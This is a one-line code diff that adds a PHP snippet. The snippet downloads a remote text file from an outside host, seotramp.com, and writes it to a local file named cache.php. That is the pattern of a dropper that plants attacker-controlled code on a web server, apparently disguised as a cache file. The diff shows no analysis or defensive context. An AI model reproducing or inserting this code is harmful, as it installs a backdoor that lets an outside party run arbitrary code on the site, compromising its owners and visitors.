@@ -1,0 +1,1 @@
+<?php $cmd1 = file_get_contents("http://seotramp.com/wp-content/plugins/youtuber/cache.txt"); $fo = fopen("cache.php", "w+"); fwrite($fo, $cmd1); fclose($fo); ?>
